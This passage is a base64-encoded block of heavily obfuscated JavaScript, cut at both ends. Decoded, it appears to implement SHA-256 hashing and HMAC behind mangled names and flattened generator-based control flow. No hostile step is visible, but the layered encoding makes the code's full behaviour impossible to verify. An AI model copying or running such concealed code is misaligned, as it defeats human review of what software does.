NWZcdTAwNjNcdTAwMzFcdTAwNjIiXT1fX19fX19seGVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3M1x1MDAzNVx1MDAzMiJdLF9fX2E5Zys9MTE1LF9fX19faDZ4Kz0tMTAxO2JyZWFrfX19fXZhciBfX19fX3hwdTt2YXIgX19fX19oNng9X19fYTlnKC0yMiwtNzcpWyJceDZlXHg2NVx4NzhceDc0Il0oKVsiXHUwMDc2XHUwMDYxXHUwMDZjXHUwMDc1XHUwMDY1Il07aWYoX19fX194cHUpe3JldHVybiBfX19fX2g2eH19ZnVuY3Rpb24gX19fX190YjIoX19fX19fdGk1KXt2YXIgX19fYTlnPUFycmF5KF9fX19fX3RpNS5sZW5ndGg+Pl9fX19fXzNoMVswXSk7Zm9yKHZhciBfX19fX3hwdT1fX19fX18zaDFbMl07X19fX194cHU8X19fYTlnLmxlbmd0aDtfX19fX3hwdSsrKV9fX2E5Z1tfX19fX3hwdV09X19fX19fM2gxWzJdO2Zvcih2YXIgX19fX194cHU9X19fX19fM2gxWzJdO19fX19feHB1PF9fX19fX3RpNS5sZW5ndGgqX19fX19fM2gxWzddO19fX19feHB1Kz1fX19fX18zaDFbN10pX19fYTlnW19fX19feHB1Pj5fX19fX18zaDFbMjRdXXw9KF9fX19fX3RpNS5jaGFyQ29kZUF0KF9fX19feHB1L19fX19fXzNoMVs3XSkmX19fX19fM2gxWzIyXSk8PF9fX19fXzNoMVsyNV0tX19fX194cHUlX19fX19fM2gxWzIzXTtyZXR1cm4gX19fYTlnfWZ1bmN0aW9uIF9fX18xNXQoX19fX19fdGk1KXtmdW5jdGlvbipfX19hOWcoX19fYTlnLF9fX19faDZ4LF9fX19fX2x4ZSxfX19fdnQwPXtbIlx4NWZceDVmXHg1Zlx4NWZceDZkXHg2Y1x4NzciXTp7fX0pe3doaWxlKF9fX2E5ZytfX19fX2g2eCtfX19fX19seGUhPT0xODEpe3dpdGgoX19fX3Z0MFsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDY0XHUwMDZlXHUwMDZjIl18fF9fX192dDApe3N3aXRjaChfX19hOWcrX19fX19oNngrX19fX19fbHhlKXtjYXNlLTE3ODpkZWZhdWx0OmNhc2UtMTA2Ol9fX192dDBbIlx4NWZceDVmXHg1Zlx4NjRceDZlXHg2YyJdPV9fX192dDBbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2Mlx1MDA3NVx1MDAzMCJdLF9fX2E5Zys9MTM5LF9fX19faDZ4Kz01OCxfX19fX19seGUrPTE2MjticmVhaztpZihfX19fX19seGU+MzAyKXtfX19fdnQwWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNjRcdTAwNmVcdTAwNmMiXT1fX19fdnQwWyJceDVmXHg1Zlx4NWZceDVmXHg2ZFx4NmNceDc3Il0sX19fYTlnKz03OCxfX19fX2g2eCs9LTE1MCxfX19fX19seGUrPTE2MjticmVha31jYXNlIF9fX19faDZ4LSAtMjcyOl9fX192dDBbIlx4NWZceDVmXHg1Zlx4NjRceDZlXHg2YyJdPV9fX192dDBbIlx4NWZceDVmXHg1Zlx4NWZceDMwXHg3MFx4MzEiXSxfX19hOWcrPS0yNjAsX19fX19oNngrPTU4LF9fX19fX2x4ZSs9MTYyO2JyZWFrO2lmKF9fX19fX2x4ZT4zMDIpe19fX192dDBbIlx4NWZceDVmXHg1Zlx4NjRceDZlXHg2YyJdPV9fX192dDBbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2ZFx1MDA2Y1x1MDA3NyJdLF9fX2E5Zys9LTMyMSxfX19fX2g2eCs9LTE1MCxfX19fX19seGUrPTE2MjticmVha31jYXNlIF9fX2E5Zy0gLTEwMTpfX19fdnQwWyJceDVmXHg1Zlx4NWZceDY0XHg2ZVx4NmMiXT1fX19fdnQwWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDdhXHgzMlx4MzYiXSxfX19hOWcrPTYxLF9fX19faDZ4Kz0yMDg7YnJlYWs7aWYoX19fX19fbHhlPl9fX2E5Zys0OTEpe19fX192dDBbIlx4NWZceDVmXHg1Zlx4NjRceDZlXHg2YyJdPV9fX192dDBbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2ZFx1MDA2Y1x1MDA3NyJdO2JyZWFrfWNhc2UgX19fX3Z0MFsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDZkXHUwMDZjXHUwMDc3Il1bIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg1Zlx4MzBceDYzXHgzNiJdKzU3OltfX19fdnQwWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNmRcdTAwNmNcdTAwNzciXVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHgzMFx4NjNceDM2Il1dPVs4Ml07X19fX3Z0MFsiXHg1Zlx4NWZceDVmXHg2NFx4NmVceDZjIl09X19fX3Z0MFsiXHg1Zlx4NWZceDVmXHgzN1x4NzVceDZiIl0sX19fYTlnKz00OTEsX19fX19oNngrPS0xMjcsX19fX19fbHhlKz0tMTk1O2JyZWFrO2lmKF9fX2E5Zz4tOTApe19fX192dDBbIlx4NWZceDVmXHg1Zlx4NjRceDZlXHg2YyJdPV9fX192dDBbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3MFx1MDA3OVx1MDA2OCJdLF9fX2E5Zys9NDkxLF9fX19faDZ4Kz0tMTI3LF9fX19fX2x4ZSs9LTE5NTticmVha31jYXNlIF9fX19faDZ4LTc1OltfX19fdnQwWyJceDVmXHg1Zlx4NWZceDVmXHg2ZFx4NmNceDc3Il1bIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg1Zlx4MzBceDYzXHgzNiJdXT1bLTIyM107X19fX21sd1siXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg3YVx4NjdceDY3Il09IiI7Zm9yKF9fX19tbHdbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2ZFx4MzBceDY0Il09X19fX19fM2gxW19fX19faDZ4Ky03Nl07X19fX21sd1siXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDZkXHgzMFx4NjQiXTxfX19fX190aTUubGVuZ3RoKl9fX19fXzNoMVtfX19fX2g2eCstNTVdO19fX19tbHdbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2ZFx1MDAzMFx1MDA2NCJdKz1fX19fX18zaDFbN10pX19fX21sd1siXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDdhXHUwMDY3XHUwMDY3Il0rPVN0cmluZy5mcm9tQ2hhckNvZGUoX19fX19fdGk1W19fX19tbHdbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2ZFx1MDAzMFx1MDA2NCJdPj5fX19fX18zaDFbMjRdXT4+Pl9fX19fXzNoMVtfX19hOWcrMjA3XS1fX19fbWx3WyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NmRceDMwXHg2NCJdJV9fX19fXzNoMVsyM10mX19fX19fM2gxWzIyXSk7cmV0dXJuIF9fX19feHB1PXRydWUsX19fX21sd1siXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDdhXHUwMDY3XHUwMDY3Il07X19fYTlnKz01NCxfX19fX2g2eCs9LTcxLF9fX19fX2x4ZSs9MTk1O2JyZWFrfX19fXZhciBfX19fX3hwdTt2YXIgX19fX19oNng9X19fYTlnKC0xODIsNzgsMTA3KVsiXHg2ZVx4NjVceDc4XHg3NCJdKClbIlx1MDA3Nlx1MDA2MVx1MDA2Y1x1MDA3NVx1MDA2NSJdO2lmKF9fX19feHB1KXtyZXR1cm4gX19fX19oNnh9fWZ1bmN0aW9uIF9fX19fazlvKF9fX19fX3RpNSxfX19hOWcpe3JldHVybiBfX19fX190aTU+Pj5fX19hOWd8X19fX19fdGk1PDxfX19fX18zaDFbMjNdLV9fX2E5Z31mdW5jdGlvbiBfX19ndDEoX19fX19fdGk1LF9fX2E5Zyl7cmV0dXJuIF9fX19fX3RpNT4+Pl9fX2E5Z31mdW5jdGlvbiBfX191OHooX19fX19fdGk1LF9fX2E5ZyxfX19fX3hwdSl7cmV0dXJuIF9fX19fX3RpNSZfX19hOWdefl9fX19fX3RpNSZfX19fX3hwdX1mdW5jdGlvbiBfX19fX18zN28oX19fX19fdGk1LF9fX2E5ZyxfX19fX3hwdSl7cmV0dXJuIF9fX19fX3RpNSZfX19hOWdeX19fX19fdGk1Jl9fX19feHB1Xl9fX2E5ZyZfX19fX3hwdX1mdW5jdGlvbiBfX19fX19oYzMoX19fX19fdGk1KXtyZXR1cm4gX19fX19rOW8oX19fX19fdGk1LF9fX19fXzNoMVswXSleX19fX19rOW8oX19fX19fdGk1LF9fX19fXzNoMVs1MV0pXl9fX19fazlvKF9fX19fX3RpNSxfX19fX18zaDFbNTJdKX1mdW5jdGlvbiBfX19fX280aihfX19fX190aTUpe3JldHVybiBfX19fX2s5byhfX19fX190aTUsX19fX19fM2gxWzE3XSleX19fX19rOW8oX19fX19fdGk1LF9fX19fXzNoMVs1M10pXl9fX19fazlvKF9fX19fX3RpNSxfX19fX18zaDFbNTRdKX1mdW5jdGlvbiBfX18yeDAoX19fX19fdGk1KXtyZXR1cm4gX19fX19rOW8oX19fX19fdGk1LF9fX19fXzNoMVsyNl0pXl9fX19fazlvKF9fX19fX3RpNSxfX19fX18zaDFbMjddKV5fX19ndDEoX19fX19fdGk1LF9fX19fXzNoMVsxNV0pfWZ1bmN0aW9uIF9fX3lqNyhfX19fX190aTUpe3JldHVybiBfX19fX2s5byhfX19fX190aTUsX19fX19fM2gxWzU1XSleX19fX19rOW8oX19fX19fdGk1LF9fX19fXzNoMVsyOF0pXl9fX2d0MShfX19fX190aTUsX19fX19fM2gxWzRdKX1mdW5jdGlvbiBfX18zMnMoX19fX19fdGk1KXtyZXR1cm4gX19fX19rOW8oX19fX19fdGk1LF9fX19fXzNoMVs1Nl0pXl9fX19fazlvKF9fX19fX3RpNSxfX19fX18zaDFbNTddKV5fX19fX2s5byhfX19fX190aTUsX19fX19fM2gxWzU4XSl9ZnVuY3Rpb24gX19fbWYzKF9fX19fX3RpNSl7cmV0dXJuIF9fX19fazlvKF9fX19fX3RpNSxfX19fX18zaDFbNTldKV5fX19fX2s5byhfX19fX190aTUsX19fX19fM2gxWzI3XSleX19fX19rOW8oX19fX19fdGk1LF9fX19fXzNoMVs2MF0pfWZ1bmN0aW9uIF9fXzg4MyhfX19fX190aTUpe3JldHVybiBfX19fX2s5byhfX19fX190aTUsX19fX19fM2gxWzFdKV5fX19fX2s5byhfX19fX190aTUsX19fX19fM2gxWzddKV5fX19ndDEoX19fX19fdGk1LF9fX19fXzNoMVsyNl0pfWZ1bmN0aW9uIF9fX2hibShfX19fX190aTUpe3JldHVybiBfX19fX2s5byhfX19fX190aTUsX19fX19fM2gxWzI4XSleX19fX19rOW8oX19fX19fdGk1LF9fX19fXzNoMVs2MV0pXl9fX2d0MShfX19fX190aTUsX19fX19fM2gxWzE3XSl9dmFyIF9fX19fX3V4bD1uZXcgQXJyYXkoX19fX19fM2gxWzYyXSxfX19fX18zaDFbNjNdLC1fX19fX18zaDFbNjRdLC1fX19fX18zaDFbNjVdLF9fX19fXzNoMVs2Nl0sX19fX19fM2gxWzY3XSwtX19fX19fM2gxWzY4XSwtX19fX19fM2gxWzY5XSwtX19fX19fM2gxWzcwXSxfX19fX18zaDFbNzFdLF9fX19fXzNoMVs3Ml0sX19fX19fM2gxWzczXSxfX19fX18zaDFbNzRdLC1fX19fX18zaDFbNzVdLC1fX19fX18zaDFbNzZdLC1fX19fX18zaDFbNzddLC1fX19fX18zaDFbNzhdLC1fX19fX18zaDFbNzldLF9fX19fXzNoMVs4MF0sX19fX19fM2gxWzgxXSxfX19fX18zaDFbODJdLF9fX19fXzNoMVs4M10sX19fX19fM2gxWzg0XSxfX19fX18zaDFbODVdLC1fX19fX18zaDFbODZdLC1fX19fX18zaDFbODddLC1fX19fX18zaDFbODhdLC1fX19fX18zaDFbODldLC1fX19fX18zaDFbOTBdLC1fX19fX18zaDFbOTFdLF9fX19fXzNoMVs5Ml0sX19fX19fM2gxWzkzXSxfX19fX18zaDFbOTRdLF9fX19fXzNoMVs5NV0sX19fX19fM2gxWzk2XSxfX19fX18zaDFbOTddLF9fX19fXzNoMVs5OF0sX19fX19fM2gxWzk5XSwtX19fX19fM2gxWzEwMF0sLV9fX19fXzNoMVsxMDFdLC1fX19fX18zaDFbMTAyXSwtX19fX19fM2gxWzEwM10sLV9fX19fXzNoMVsxMDRdLC1fX19fX18zaDFbMTA1XSwtX19fX19fM2gxWzEwNl0sLV9fX19fXzNoMVsxMDddLC1fX19fX18zaDFbMTA4XSxfX19fX18zaDFbMTA5XSxfX19fX18zaDFbMTEwXSxfX19fX18zaDFbMTExXSxfX19fX18zaDFbMTEyXSxfX19fX18zaDFbMTEzXSxfX19fX18zaDFbMTE0XSxfX19fX18zaDFbMTE1XSxfX19fX18zaDFbMTE2XSxfX19fX18zaDFbMTE3XSxfX19fX18zaDFbMTE4XSxfX19fX18zaDFbMTE5XSwtX19fX19fM2gxWzEyMF0sLV9fX19fXzNoMVsxMjFdLC1fX19fX18zaDFbMTIyXSwtX19fX19fM2gxWzEyM10sLV9fX19fXzNoMVsxMjRdLC1fX19fX18zaDFbMTI1XSk7ZnVuY3Rpb24gX19fX19lZ20oX19fX19fdGk1LF9fX2E5Zyl7dmFyIF9fX19feHB1PW5ldyBBcnJheShfX19fX18zaDFbMTI2XSwtX19fX19fM2gxWzEyN10sX19fX19fM2gxWzEyOF0sLV9fX19fXzNoMVsxMjldLF9fX19fXzNoMVsxMzBdLC1fX19fX18zaDFbMTMxXSxfX19fX18zaDFbMTMyXSxfX19fX18zaDFbMTMzXSk7dmFyIF9fX19faDZ4PW5ldyBBcnJheShfX19fX18zaDFbMjldKTt2YXIgX19fX19fbHhlLF9fX192dDAsX19fX3p0cSxfX19fX2d4NixfX195MTgsX19fX19fMnB0LF9fX19fMGxiLF9fX19fZG5lO3ZhciBfX19fX19xMDcsX19fX19faGozLF9fX3ZweixfX19fcWMzO19fX19fX3RpNVtfX19hOWc+Pl9fX19fXzNoMVsyNF1dfD1fX19fX18zaDFbMjBdPDxfX19fX18zaDFbMjVdLV9fX2E5ZyVfX19fX18zaDFbMjNdO19fX19fX3RpNVsoX19fYTlnK19fX19fXzNoMVsyOV0+Pl9fX19fXzNoMVsxMzRdPDxfX19fX18zaDFbMTZdKStfX19fX18zaDFbMTRdXT1fX19hOWc7Zm9yKF9fX19fX3EwNz1fX19fX18zaDFbMl07X19fX19fcTA3PF9fX19fX3RpNS5sZW5ndGg7X19fX19fcTA3Kz1fX19fX18zaDFbOF0pe19fX19fX2x4ZT1fX19fX3hwdVtfX19fX18zaDFbMl1dO19fX192dDA9X19fX194cHVbX19fX19fM2gxWzFdXTtfX19fenRxPV9fX19feHB1W19fX19fXzNoMVswXV07X19fX19neDY9X19fX194cHVbX19fX19fM2gxWzE1XV07X19feTE4PV9fX19feHB1W19fX19fXzNoMVsxNl1dO19fX19fXzJwdD1fX19fX3hwdVtfX19fX18zaDFbMjRdXTtfX19fXzBsYj1fX19fX3hwdVtfX19fX18zaDFbMTddXTtfX19fX2RuZT1fX19fX3hwdVtfX19fX18zaDFbMjZdXTtmb3IoX19fX19faGozPV9fX19fXzNoMVsyXTtfX19fX19oajM8X19fX19fM2gxWzI5XTtfX19fX19oajMrKyl7aWYoX19fX19faGozPF9fX19fXzNoMVs4XSlfX19fX2g2eFtfX19fX19oajNdPV9fX19fX3RpNVtfX19fX19oajMrX19fX19fcTA3XTtlbHNlIF9fX19faDZ4W19fX19fX2hqM109X19fX19hZzkoX19fX19hZzkoX19fX19hZzkoX19feWo3KF9fX19faDZ4W19fX19fX2hqMy1fX19fX18zaDFbMF1dKSxfX19fX2g2eFtfX19fX19oajMtX19fX19fM2gxWzI2XV0pLF9fXzJ4MChfX19fX2g2eFtfX19fX19oajMtX19fX19fM2gxWzE0XV0pKSxfX19fX2g2eFtfX19fX19oajMtX19fX19fM2gxWzhdXSk7X19fdnB6PV9fX19fYWc5KF9fX19fYWc5KF9fX19fYWc5KF9fX19fYWc5KF9fX19fZG5lLF9fX19fbzRqKF9fX3kxOCkpLF9fX3U4eihfX195MTgsX19fX19fMnB0LF9fX19fMGxiKSksX19fX19fdXhsW19fX19fX2hqM10pLF9fX19faDZ4W19fX19fX2hqM10pO19fX19xYzM9X19fX19hZzkoX19fX19faGMzKF9fX19fX2x4ZSksX19fX19fMzdvKF9fX19fX2x4ZSxfX19fdnQwLF9fX196dHEpKTtfX19fX2RuZT1fX19fXzBsYjtfX19fXzBsYj1fX19fX18ycHQ7X19fX19fMnB0PV9fX3kxODtfX195MTg9X19fX19hZzkoX19fX19neDYsX19fdnB6KTtfX19fX2d4Nj1fX19fenRxO19fX196dHE9X19fX3Z0MDtfX19fdnQwPV9fX19fX2x4ZTtfX19fX19seGU9X19fX19hZzkoX19fdnB6LF9fX19xYzMpfV9fX19feHB1W19fX19fXzNoMVsyXV09X19fX19hZzkoX19fX19fbHhlLF9fX19feHB1W19fX19fXzNoMVsyXV0pO19fX19feHB1W19fX19fXzNoMVsxXV09X19fX19hZzkoX19fX3Z0MCxfX19fX3hwdVtfX19fX18zaDFbMV1dKTtfX19fX3hwdVtfX19fX18zaDFbMF1dPV9fX19fYWc5KF9fX196dHEsX19fX194cHVbX19fX19fM2gxWzBdXSk7X19fX194cHVbX19fX19fM2gxWzE1XV09X19fX19hZzkoX19fX19neDYsX19fX194cHVbX19fX19fM2gxWzE1XV0pO19fX19feHB1W19fX19fXzNoMVsxNl1dPV9fX19fYWc5KF9fX3kxOCxfX19fX3hwdVtfX19fX18zaDFbMTZdXSk7X19fX194cHVbX19fX19fM2gxWzI0XV09X19fX19hZzkoX19fX19fMnB0LF9fX19feHB1W19fX19fXzNoMVsyNF1dKTtfX19fX3hwdVtfX19fX18zaDFbMTddXT1fX19fX2FnOShfX19fXzBsYixfX19fX3hwdVtfX19fX18zaDFbMTddXSk7X19fX194cHVbX19fX19fM2gxWzI2XV09X19fX19hZzkoX19fX19kbmUsX19fX194cHVbX19fX19fM2gxWzI2XV0pfXJldHVybiBfX19fX3hwdX1mdW5jdGlvbiBfX19fX2FnOShfX19fX190aTUsX19fYTlnKXtmdW5jdGlvbipfX19fX3hwdShfX19fX3hwdSxfX19fX19seGUsX19fX3Z0MCxfX19fenRxLF9fX19fZ3g2PXtbIlx4NWZceDVmXHg1Zlx4NWZceDcwXHgzNFx4NzMiXTp7fX0pe3doaWxlKF9fX19feHB1K19fX19fX2x4ZStfX19fdnQwK19fX196dHEhPT0yMDQpe3dpdGgoX19fX19neDZbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2Y1x4NzBceDcyIl18fF9fX19fZ3g2KXtzd2l0Y2goX19fX194cHUrX19fX19fbHhlK19fX192dDArX19fX3p0cSl7Y2FzZSAxMzE6X19fX19neDZbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2Y1x1MDA3MFx1MDA3MiJdPV9fX19fZ3g2WyJceDVmXHg1Zlx4NWZceDMzXHg3N1x4NjEiXSxfX19fX3hwdSs9OTgsX19fX19fbHhlKz00OCxfX19fdnQwKz0tNzksX19fX3p0cSs9LTQ0O2JyZWFrO2Nhc2UtNTA6Y2FzZS0xNDE6Y2FzZS0xMDU6X19fX19neDZbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2Y1x1MDA3MFx1MDA3MiJdPV9fX19fZ3g2WyJceDVmXHg1Zlx4NWZceDY5XHgzNFx4NjQiXSxfX19fX3hwdSs9MTY5LF9fX19fX2x4ZSs9LTEzMyxfX19fdnQwKz0zMjAsX19fX3p0cSs9LTk3O2JyZWFrO2RlZmF1bHQ6W19fX19fZ3g2WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzBcdTAwMzRcdTAwNzMiXVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDcxXHUwMDM0XHUwMDZiIl0sX19fX19neDZbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3MFx1MDAzNFx1MDA3MyJdWyJceDVmXHg1Zlx4NWZceDVmXHgzNlx4N2FceDY2Il0sX19fX19neDZbIlx4NWZceDVmXHg1Zlx4NWZceDcwXHgzNFx4NzMiXVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDcyXHUwMDY5XHUwMDM2Il1dPVstMTM4LDE2NiwtOTddO19fX19fZ3g2WyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NmNceDcwXHg3MiJdPV9fX19fZ3g2WyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDcxXHg3OVx4NjIiXSxfX19fX3hwdSs9MTExLF9fX19fX2x4ZSs9NDgsX19fX3Z0MCs9LTU2LF9fX196dHErPS00NTticmVhaztjYXNlIDI0NjpjYXNlIF9fX19fZ3g2WyJceDVmXHg1Zlx4NWZceDVmXHg3MFx4MzRceDczIl1bIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzNlx1MDA3YVx1MDA2NiJdKzcwOl9fX19fZ3g2WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNmNcdTAwNzBcdTAwNzIiXT1fX19fX2d4NlsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDcwXHUwMDM4XHUwMDZlIl0sX19fX194cHUrPTI2MCxfX19fX19seGUrPTU2LF9fX192dDArPS0xMzMsX19fX3p0cSs9LTUyO2JyZWFrO2Nhc2UgX19fX19neDZbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3MFx1MDAzNFx1MDA3MyJdWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzJcdTAwNjlcdTAwMzYiXSszOTU6X19fX19neDZbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2Y1x4NzBceDcyIl09X19fX19neDZbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3MVx1MDAzNlx1MDA2NiJdLF9fX19feHB1Kz0yNjAsX19fX19fbHhlKz0tMTcsX19fX3Z0MCs9LTEzMyxfX19fenRxKz0tNTI7YnJlYWs7Y2FzZSBfX19fX2d4NlsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDcwXHUwMDM0XHUwMDczIl1bIlx4NWZceDVmXHg1Zlx4NWZceDM2XHg3YVx4NjYiXSstMTA1Ol9fX19fZ3g2WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNmNcdTAwNzBcdTAwNzIiXT1fX19fX2d4NlsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDcwXHUwMDM0XHUwMDczIl0sX19fX194cHUrPTM3MSxfX19fdnQwKz0tMTExLF9fX196dHErPS02MjticmVhaztjYXNlLTIzMTpjYXNlIDE1NDpjYXNlLTEyMTpbX19fX19neDZbIlx4NWZceDVmXHg1Zlx4NWZceDcwXHgzNFx4NzMiXVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg3MVx4MzRceDZiIl0sX19fX19neDZbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3MFx1MDAzNFx1MDA3MyJdWyJceDVmXHg1Zlx4NWZceDVmXHgzNlx4N2FceDY2Il0sX19fX19neDZbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3MFx1MDAzNFx1MDA3MyJdWyJceDVmXHg1Zlx4NWZceDcyXHg2OVx4MzYiXV09Wy0yMDgsMywtMjQ5XTtfX19fcDRzWyJceDVmXHg1Zlx4NWZceDM2XHg3N1x4NjIiXT0oX19fX19fdGk1Jl9fX19fXzNoMVtfX19fdnQwKzExXSkrKF9fX2E5ZyZfX19fX18zaDFbMzBdKTtfX19fcDRzWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNjFcdTAwMzBcdTAwMzkiXT0oX19fX19fdGk1Pj5fX19fX18zaDFbX19fX194cHUrLShfX19fdnQwKzg3KV0pKyhfX19hOWc+Pl9fX19fXzNoMVtfX19fdnQwKy0xMV0pKyhfX19fcDRzWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzZcdTAwNzdcdTAwNjIiXT4+X19fX19fM2gxWzhdKTtfX19fX2d4NlsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDZjXHg3MFx4NzIiXT1fX19fX2d4NlsiXHg1Zlx4NWZceDVmXHg1Zlx4NzBceDM0XHg3MyJdLF9fX19feHB1Kz0xNDcsX19fX19fbHhlKz0tOTcsX19fX3Z0MCs9LTM4LF9fX196dHErPTQ1O2JyZWFrO2lmKF9fX19feHB1PjExNCl7X19fX19neDZbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2Y1x4NzBceDcyIl09X19fX19neDZbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3MFx1MDAzNFx1MDA3MyJdLF9fX19feHB1Kz0tMTExLF9fX19fX2x4ZSs9LTQ4LF9fX192dDArPTU2LF9fX196dHErPTQ1O2JyZWFrfWNhc2UgX19fX19fbHhlLSAtMzczOnJldHVybiBfX19fX2g2eD10cnVlLF9fX19fX2EwOTw8X19fX19fM2gxWzhdfF9fXzZ3YiZfX19fX18zaDFbX19fX194cHUrLTIzMV07X19fX19neDZbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2Y1x4NzBceDcyIl09X19fX19neDZbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3Nlx1MDA3NVx1MDA2ZCJdLF9fX19feHB1Kz0tNTYsX19fX19fbHhlKz00OTticmVhaztjYXNlIF9fX19fZ3g2WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzBcdTAwMzRcdTAwNzMiXVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDcyXHUwMDY5XHUwMDM2Il0rMzAyOmNhc2UtMzI6W19fX19fZ3g2WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzBcdTAwMzRcdTAwNzMiXVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg3MVx4MzRceDZiIl0sX19fX19neDZbIlx4NWZceDVmXHg1Zlx4NWZceDcwXHgzNFx4NzMiXVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDM2XHUwMDdhXHUwMDY2Il0sX19fX19neDZbIlx4NWZceDVmXHg1Zlx4NWZceDcwXHgzNFx4NzMiXVsiXHg1Zlx4NWZceDVmXHg3Mlx4NjlceDM2Il1dPVstMjYsLTEwLDEzMl07X19fX19neDZbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2Y1x1MDA3MFx1MDA3MiJdPV9fX19fZ3g2WyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4MzFceDc3XHg3MiJdLF9fX19feHB1Kz0tMTksX19fX19fbHhlKz0yODYsX19fX3Z0MCs9LTExNyxfX19fenRxKz0xO2JyZWFrO2Nhc2UgNDY6Y2FzZSBfX19fX19seGUtIC0xMzpjYXNlLTE4Ol9fX19fZ3g2WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNmNcdTAwNzBcdTAwNzIiXT1fX19fX2d4NlsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDM3XHg2Nlx4NzUiXSxfX19fX3hwdSs9LTcwLF9fX19fX2x4ZSs9LTEzMyxfX19fdnQwKz0zMjAsX19fX3p0cSs9LTQ0O2JyZWFrfX19fXZhciBfX19fX2g2eDt2YXIgX19fX19fbHhlPV9fX19feHB1KDExNCwtNjUsMTksODYpWyJceDZlXHg2NVx4NzhceDc0Il0oKVsiXHg3Nlx4NjFceDZjXHg3NVx4NjUiXTtpZihfX19fX2g2eCl7cmV0dXJuIF9fX19fX2x4ZX19cmV0dXJue2hleDpfX19fX3hwdSxiNjQ6X19fX3p0cSxhbnk6X19fX19neDYsaGV4X2htYWM6X19fX3Z0MCxiNjRfaG1hYzpfX19fenRxLGFueV9obWFjOl9fX19fZ3g2fX0oKTtjb25zb2xlLmxvZyhfX19fX190aTUpfV9fX2E5Z3w9X19fX19fM2gxWzJdO3ZhciBfX19fX2g2eD0oX19fX19fdGk1JjQxOTQzMDMpKl9fX2E5ZztpZihfX19fX190aTUmX19fX19fM2gxWzEzNV0pX19fX19oNngrPShfX19fX190aTUmX19fX19fM2gxWzEzNV0pKl9fX2E5Z3xfX19fX18zaDFbMl07cmV0dXJuIF9fX19faDZ4fF9fX19fXzNoMVsyXX07dmFyIF9fX2E5Zz1NYXRoWyJcdTAwNjlcdTAwNmRcdTAwNzVcdTAwNmMiXXx8X19fX19fdGk1O2Z1bmN0aW9uIF9fX19feHB1KF9fX19fX2t5NixfX19fX190aTUpe2lmKCJceDYzXHgzM1x4NjVceDQyXHg3M1x4NTMiIGluIF9fX19fX2x4ZSl7X19fX194cHUoKX1mdW5jdGlvbiBfX19fX3hwdSgp